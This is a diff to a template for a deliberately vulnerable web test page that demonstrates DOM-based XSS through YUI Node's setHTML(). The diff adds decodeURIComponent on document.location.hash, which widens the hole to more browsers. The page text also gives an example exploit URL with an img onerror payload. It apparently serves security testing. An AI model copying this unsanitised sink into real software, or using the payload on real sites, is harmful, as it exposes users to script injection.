@@ -2,7 +2,7 @@
 
 {{template "header" }}
 
-XSS due to the document.location.hash used in YUI Node's setHTML(). The attack works in Firefox.<p>
+XSS due to the unencoded document.location.hash used in YUI Node's setHTML(). The attack works in Firefox and in the webkit browsers.<p>
 
 Exploit: /xss/dom/yuinode_hash?#in=&lt;img src=foo onerror=alert(148)&gt; (remember to reload the page!)<p>
 
@@ -11,7 +11,7 @@ Hello!<BR>The value of &quot;in&quot; hash parameter is: <div id="inparam">in pl
 <script>
   YUI().use("console", "node", function(Y) {
   var inparam = Y.one("#inparam");
-  var input = document.location.hash; 
+  var input = decodeURIComponent(document.location.hash); 
   inparam.setHTML(input);
 });
 </script>
